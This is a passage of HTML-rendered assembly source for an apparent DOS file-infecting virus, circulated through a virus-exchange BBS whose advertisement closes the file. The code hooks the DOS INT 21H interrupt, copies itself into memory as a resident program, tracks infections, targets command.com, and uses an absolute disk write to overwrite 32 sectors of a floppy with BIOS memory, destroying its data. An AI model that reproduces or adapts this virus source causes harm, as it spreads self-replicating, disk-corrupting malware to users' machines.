    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get drive letter from pathname</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">          </span><span class="sc1">; Is drive letter 'A'?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">          </span><span class="sc1">; Is drive letter 'a'?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc12">'b'</span><span class="sc0">          </span><span class="sc1">; Is drive letter 'b'?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0130</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc12">'B'</span><span class="sc0">          </span><span class="sc1">; Is drive letter 'B'?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0130</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Restore registers and terminate</span><span class="sc0">

    </span><span class="sc1">; Drive A</span><span class="sc0">

</span><span class="sc5">BP0120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Set drive A</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0140</span><span class="sc0">

    </span><span class="sc1">; Drive B</span><span class="sc0">

</span><span class="sc5">BP0130</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Set drive B</span><span class="sc0">
</span><span class="sc5">BP0140</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">           </span><span class="sc1">; Is this the same as current?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0150</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Restore registers and terminate</span><span class="sc0">

    </span><span class="sc1">; Write lump of BIOS to floppy disk</span><span class="sc0">

</span><span class="sc5">BP0150</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0FE00H</span><span class="sc0">       </span><span class="sc1">; \ Address BIOS (?)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0020H</span><span class="sc0">        </span><span class="sc1">; Write 32 sectors</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Start at sector one</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">26H</span><span class="sc0">         </span><span class="sc1">; Absolute disk write</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">            </span><span class="sc1">; Display string function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1840H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
</span><span class="sc5">BP0160</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">BP0170</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">INT_21</span><span class="sc0">       </span><span class="sc1">; Branch to original Int 21H</span><span class="sc0">

    </span><span class="sc1">; Original Int 21H vector</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">138DH</span><span class="sc0">           </span><span class="sc1">; Int 21H offset</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0295H</span><span class="sc0">           </span><span class="sc1">; Int 21H segment</span><span class="sc0">

    </span><span class="sc1">; Entry point for infected program</span><span class="sc0">

</span><span class="sc5">BP0180</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0190</span><span class="sc0">          </span><span class="sc1">; \ Get current address</span><span class="sc0">
</span><span class="sc5">BP0190</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Address back to BP0180</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address of virus start</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0180</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Save address of virus start</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FILELN</span><span class="sc0">    </span><span class="sc1">; Address file length</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">          </span><span class="sc1">; Get current disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Save current disk</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get file length</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; Add PSP length</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; \ Convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Allow for remainder</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Copy paragraphs to keep</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc0">          </span><span class="sc1">; Set block function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0200</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0220</span><span class="sc0">          </span><span class="sc1">; Pass control to host</span><span class="sc0">

    </span><span class="sc1">; Allocate memory for virus</span><span class="sc0">

</span><span class="sc5">BP0200</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Bits to move</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; Convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">; Allow for remainder</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Copy paragraphs for virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">          </span><span class="sc1">; Allocate memory function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0210</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0220</span><span class="sc0">          </span><span class="sc1">; Pass control to host</span><span class="sc0">

    </span><span class="sc1">; Install virus in memory</span><span class="sc0">

</span><span class="sc5">BP0210</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Preserve allocated memory segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3521H</span><span class="sc0">        </span><span class="sc1">; Get Int 21H function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save Int 21H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save Int 21H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; Recover allocated memory segment</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0180</span><span class="sc0">    </span><span class="sc1">; Address back to start of virus</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Target start of new area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; \ Length of virus</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Copy virus to new area</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get Int 21H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; \ Set DS to Int 21H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2544H</span><span class="sc0">        </span><span class="sc1">; Set Int 44H function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; \ Set DS to ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Interrupt 21H routine (BP0010)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2521H</span><span class="sc0">        </span><span class="sc1">; Set Int 21H function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">BP0220</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ENTPTR</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Push COM file entry address</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">; ...and return to it</span><span class="sc0">

</span><span class="sc5">PATHNM</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'b:\command.com'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Pathname</span><span class="sc0">
</span><span class="sc5">BUFFER</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">7FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Read buffer</span><span class="sc0">
</span><span class="sc5">ENTPTR</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0CB0H</span><span class="sc0">           </span><span class="sc1">; File entry address</span><span class="sc0">
</span><span class="sc5">N_AORB</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; "Not A or B" switch</span><span class="sc0">
</span><span class="sc5">INFCNT</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Infection count</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CURDSK</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Current disk</span><span class="sc0">
</span><span class="sc5">FILELN</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">5AAAH</span><span class="sc0">           </span><span class="sc1">; File length</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">65A9H</span><span class="sc0">           </span><span class="sc1">; Infection indicator</span><span class="sc0">

</span><span class="sc5">ENDADR</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc9">END</span><span class="sc0">

</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ&gt; and Remember Don't Forget to Call &lt;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤ&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;ฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">

</span></div></body>
</html>
